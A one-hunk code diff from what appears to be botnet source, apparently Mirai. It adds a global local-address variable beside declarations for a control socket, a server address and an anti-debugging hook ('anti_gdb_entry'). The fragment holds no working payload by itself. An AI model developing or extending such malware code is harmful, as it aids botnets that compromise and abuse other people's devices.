@@ -34,6 +34,7 @@ static BOOL unlock_tbl_if_nodebug(char *);
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
 BOOL pending_connection = FALSE;
+ipv4_t LOCAL_ADDR;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
 #ifdef DEBUG
